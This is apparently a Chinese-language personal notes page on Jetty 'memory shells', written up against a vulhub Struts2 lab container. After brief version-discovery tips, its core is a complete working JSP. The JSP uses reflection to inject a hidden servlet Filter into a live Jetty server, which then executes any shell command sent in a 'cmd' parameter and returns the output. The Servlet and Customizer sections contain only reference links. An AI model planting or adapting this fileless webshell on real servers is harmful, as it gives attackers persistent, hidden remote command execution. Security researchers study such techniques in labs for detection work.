---
date: 2024-09-19
---

# Jetty内存马

Eclipse Jetty 是一个轻量级、高度可扩展、基于 Java 的 Web 服务器和 Servlet 引擎。Jetty 的目标是以高容量、低延迟的方式支持 Web 协议（HTTP/1、HTTP/2、HTTP/3、WebSocket 等），从而提供最高性能，同时保持易用性和与多年 Servlet 开发的兼容性。

Jetty 是一种现代的完全异步 Web 服务器，作为面向组件的技术有着悠久的历史，可以轻松嵌入到应用程序中，同时仍然为 Web 应用程序部署提供可靠的传统发行版。

---

## 基本信息收集

### 查看版本号

- Web侧的话

  - 响应标头中可能会有 Jetty 版本信息, 例如:

    ![image-20240918162938756](http://cdn.ayusummer233.top/DailyNotes/202409181629820.png)

  - Wappalyzer 应该也是用的上面这种方案获取的版本信息:

    ![image-20240918163003019](http://cdn.ayusummer233.top/DailyNotes/202409181630064.png)

- 主机侧的话

  - 可以在 JavaWeb 项目的 `pom.xml` 中看到 jetty 的版本号

    ![image-20240918162309589](http://cdn.ayusummer233.top/DailyNotes/202409181623686.png)

  - 直接 `find / | grep jetty` 也可能看到相应路径信息中显示的 jetty 版本信息:

    ![image-20240918162417425](http://cdn.ayusummer233.top/DailyNotes/202409181624482.png)

---

## 构造可用的 Servlet

Jetty 9.2.x 提供了更加安全且可维护的方式来处理 `Servlet` 的动态注册

可以通过 `ServletHandler` 和 `ServletHolder` 来动态注册 `Servlet`，并设置 URL 映射。这不再需要反射访问私有字段

> TODO: 搞不出来, 看了下 `web.xml` 里也没有配置 servlet mapping 之类的, 遂放弃

---

## 构造内存马

> [Jetty 内存马注入分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/12182?time__1311=GqGxRDniiQQ0526Dy7D97rTnikxuYoD#toc-3)
>
> [memShell/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java at master · feihong-cs/memShell (github.com)](https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java)
>
> [3gstudent-Blog](https://3gstudent.github.io/)
>
> [Java利用技巧——Jetty Servlet型内存马 (3gstudent.github.io)](https://3gstudent.github.io/Java利用技巧-Jetty-Servlet型内存马)

---

## Filter内存马

> [从0到1学会Jetty内存马注入 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/15141?u_atoken=1f048c5fb527d82d5ec4ba4c07b4c57d&u_asig=0a472f8c17266484778997576e004d)
>
> [memShell/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java at master · feihong-cs/memShell (github.com)](https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java)
>
> [Java利用技巧——Jetty Filter型内存马 (3gstudent.github.io)](https://3gstudent.github.io/Java利用技巧-Jetty-Filter型内存马)
>
> [Jetty 内存马注入分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/12182?time__1311=GqGxRDniiQQ0526Dy7D97rTnikxuYoD#toc-3)

环境: vulhub 的 s2-045 Docker, 其中 Jetty 版本为 9.2.11

---

```jsp
<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%@ page import="java.util.Scanner"%>
<%@ page import="java.util.EnumSet"%>
<%@ page import="java.io.*"%>

<%
    String filterName = "myFilter";
    String urlPattern = "/filter";
    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner( in ).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().write(output);
                servletResponse.getWriter().flush();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        @Override
        public void destroy() {
        }
    };

    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;

    for (Thread thread:threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                
                // 打印调试信息
                out.println("webAppContext class: " + webAppContext.getClass().getName() + "<br>");
                out.println("webAppContext superclass: " + webAppContext.getClass().getSuperclass().getName() + "<br>");
                
                try {
                    // 获取 _servletHandler 字段
                    Field fieldServletHandler = webAppContext.getClass().getSuperclass().getSuperclass().getDeclaredField("_servletHandler");
                    fieldServletHandler.setAccessible(true);
                    Object servletHandler = fieldServletHandler.get(webAppContext);
                    Field fieldFilters = servletHandler.getClass().getDeclaredField("_filters");
                    fieldFilters.setAccessible(true);
                    Object[] filters = (Object[]) fieldFilters.get(servletHandler);
                    boolean flag = false;
                    for(Object f:filters){
                        Field fieldName = f.getClass().getSuperclass().getDeclaredField("_name");
                        fieldName.setAccessible(true);
                        String name = (String) fieldName.get(f);
                        if(name.equals(filterName)){
                            flag = true;
                            break;
                        }
                    }
                    if(flag){
                        out.println("[-] Filter " + filterName + " exists.<br>");
                        return;
                    }
                    out.println("[+] Add Filter: " + filterName + "<br>");
                    out.println("[+] urlPattern: " + urlPattern + "<br>");
                    ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                    Class sourceClazz = null;
                    Object holder = null;
                    Field field = null;
                    try{
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                        field = sourceClazz.getDeclaredField("JAVAX_API");
                        Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandler, field.get(null));
                    }catch(ClassNotFoundException e){
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                        Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                    }
                    holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);               
                    holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
                    servletHandler.getClass().getMethod("addFilter", holder.getClass()).invoke(servletHandler, holder);

                    Class  clazz         = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
                    Object filterMapping = clazz.newInstance();
                    Method method        = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
                    method.setAccessible(true);
                    method.invoke(filterMapping, holder);
                    filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
                    filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
                    servletHandler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(servletHandler, filterMapping);
                } catch (NoSuchFieldException e) {
                    out.println("Error: " + e.getMessage() + "<br>");
                }
            }     
        }
    }
%>
```

![image-20240920152529930](http://cdn.ayusummer233.top/DailyNotes/202409201525001.png)

![image-20240920145928096](http://cdn.ayusummer233.top/DailyNotes/202409201459280.png)

![image-20240920150008171](http://cdn.ayusummer233.top/DailyNotes/202409201500230.png)

---

## Servlet型内存马

> [Java利用技巧——Jetty Servlet型内存马 (3gstudent.github.io)](https://3gstudent.github.io/Java利用技巧-Jetty-Servlet型内存马)





---

## Customizer型内存马

> [一种在高版本JDK下 的新型嵌入式Jetty Customizer内存马实现 - 白帽酱の博客 (rce.moe)](https://rce.moe/2023/08/19/Jetty-Customize-memory-webshell/)



